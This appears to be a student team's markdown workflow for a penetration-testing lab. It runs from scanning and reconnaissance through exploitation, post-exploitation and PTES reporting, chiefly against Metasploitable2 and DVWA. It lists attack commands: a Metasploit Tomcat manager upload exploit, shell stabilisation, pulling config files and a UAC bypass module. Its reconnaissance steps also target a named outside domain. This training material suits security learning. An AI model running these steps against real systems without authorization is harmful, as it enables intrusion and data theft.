# 🔧 Workflow Steps – Week 2 VAPT Cycle

This document contains the full step-by-step workflow used during Week 2 activities, including scanning, recon, exploitation, and reporting. All steps follow PTES methodology and use only authorized lab environments (Metasploitable2, DVWA, Kali Linux).

# 1 Vulnerability Scanning Workflow

Tools Used

    -Nmap
    -Nikto
    -OpenVAS

Steps

1. Identify target IP using ip a or VirtualBox network details.

2. Run basic Nmap scan:

   _`nmap -sV 192.168.0.16`_

3. Run Nikto web vulnerability scan:

   _`nikto -h http://192.168.0.16`_

4. Start OpenVAS services:

   _Greenbone Enterpriese trail_

5. Create target & run a full vulnerability scan in OpenVAS GUI.
6. Export results: PDF + CSV.
7. Map vulnerabilities to CVSS v4.0 using NVD.
8. Prioritize findings (Critical → Low).
9. Save screenshots + results into Documentation/Scan Reports.

# 2. Reconnaissance Workflow

Tools Used

- Shodan

- Maltego

- WHOIS

- Sublist3r

- Wappalyzer

Steps

1. Perform WHOIS Lookup
   _`whois graceintlgroup.com`_

2. Enumerate Subdomains
   _`sublist3r -d graceintlgroup.com`_

3. Use Shodan

Analyze exposed ports, services, banners, and metadata through the Shodan web interface.

4. Use Maltego

Map relationships between domains, emails, DNS records, and infrastructure.

Visualize connections using graph views.

5. Identify Technology Stack

Use Wappalyzer browser extension to detect frameworks, server software, CMS, JS libraries, etc.

6. Additional Enumeration

Sublist3r used to discover numerous subdomains for deeper asset visibility.

7. Storage of Recon Outputs

All recon findings documented in:

- 📄 Documentation/Documentation/Reconnaissance.pdf

- 🖼️ Documentation/Screenshots/recon/ (all recon screenshots)

# 3. Exploitation Workflow

Tools Used

- Metasploit Framework

- SearchSploit

- Burp Suite

- Hydra

DVWA / Metasploitable2

Steps

Confirm target host and open ports from Nmap scan.

Search for possible exploits using:
searchsploit vsftpd or msfconsole → search tomcat

Launch Metasploit:
`msfconsole`

Select exploit module, for example:
`use exploit/multi/http/tomcat_mgr_upload`

Set required parameters:

```
   set RHOSTS 192.168.0.16
   set RPORT 8080

```

Execute the payload:
`exploit`

Validate shell access (meterpreter or reverse shell).

Stabilize shell if needed:
python3 -c 'import pty; pty.spawn("/bin/bash")'

Save exploitation screenshots in:
Documentation/Screenshots/Exploitation/

Document exploited service & CVE reference in:
dDcumenation/Exploitation.pdf

# 4.Post-Exploitation Workflow

Tools Used

- Meterpreter

- PowerShell / cmd.exe

- SharpHound/BloodHound (AD only)

- sha256sum

- Volatility (if memory dump involved)

Steps

Confirm privileges:
`whoami`

Enumerate system:

`systeminfo`

`hostname`

`ipconfig /all`

File evidence collection:

Copy config files:
`download *.conf`

Hash the file:
`sha256sum *.conf`

Privilege Escalation attempt :

```
   use exploit/multi/handler
   use exploit/windows/local/bypassuac_fodhelper
```

After escalation, run:
`sysinfo`
Collect proof.txt (if CTF style) or sensitive logs.

Document each action in:
Documenation/Documenation/Post Expolitation.pdf → Post-Exploitation section

Save screenshots in:
Documentation/Screenshots/Post-Exploitation/

Add all evidence hashes to:
Documenation/Documenation/Post

# 5.Reporting Workflow

Tools Used

- Microsoft Word

- Draw.io (for diagrams)

- CVSS Calculator

- PTES Framework

Steps

Consolidate all data:

Scans (Nmap, Nikto, OpenVAS)

Recon results

Exploitation evidence

Hash values

Prioritize vulnerabilities by CVSS (Critical → Low).

Write PTES report sections:

Engagement Scope

Methodology

Recon Findings

Vulnerability Summary

Exploitation Details

Remediation

Create two summaries:

Recon Summary

Non-Technical Summary

Export final report to PDF:
Documentation/PTES Reports/PTES_Report.pdf

Update GitHub folder structure as:

```
cyart-vapt-team/
└── Week 2/
    ├── Documentation/
    ├── Workflow/
    ├── Summaries/
    └── README.md
```

This completes the full Week 2 VAPT workflow following the PTES methodology. All scanning, reconnaissance, exploitation, post-exploitation, and reporting steps have been executed in a controlled lab environment using Kali Linux, DVWA, and Metasploitable2.

📌 What Has Been Completed

✔ Full vulnerability scanning (Nmap, Nikto, OpenVAS)

✔ Reconnaissance (WHOIS, Maltego, Shodan, Sublist3r)

✔ Exploitation (Metasploit modules, manual validation)

✔ Post-exploitation (privilege checks, evidence collection, hashing)

✔ Reporting (CVSS scoring, PTES reports, non-technical summary)

✔ Screenshots, reports, and notes organized into folders
